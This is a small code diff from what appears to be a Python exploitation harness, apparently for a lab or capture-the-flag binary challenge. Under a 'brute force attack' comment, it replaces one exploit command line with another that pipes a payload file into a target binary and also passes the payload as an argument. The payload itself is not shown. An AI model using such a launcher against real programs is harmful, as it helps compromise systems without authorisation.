@@ -329,7 +329,6 @@ def main():
     attach_strace()
 
     #performing brute force attack
-    # exploit_command = f"cat payload - | {target} " + " ".join(["`cat trash`"] * 15)
     exploit_command = f"cat payload - | /mnt/binaries/{target} `cat payload`"
 
     i = 0
